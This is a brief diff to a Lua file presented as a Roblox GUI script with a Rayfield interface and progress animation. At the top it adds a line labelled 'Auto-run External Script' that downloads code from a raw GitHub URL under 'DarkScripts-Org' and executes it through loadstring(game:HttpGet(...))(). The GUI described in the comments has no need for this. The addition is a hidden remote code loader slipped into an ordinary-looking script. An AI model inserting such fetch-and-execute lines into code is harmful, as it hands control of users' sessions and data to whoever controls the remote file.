@@ -1,3 +1,5 @@
+-- Auto-run External Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkScripts-Org/Dark-Scripts/refs/heads/main/9cdf6aa30919b1f49eab9cb3d41e5190.txt"))()
 -- Roblox GUI Script (Rayfield UI Enhanced + Custom Progress Animation)
 -- Full-featured GUI with gradient black screen, stroke watermark, slider progress, and smooth transitions
 
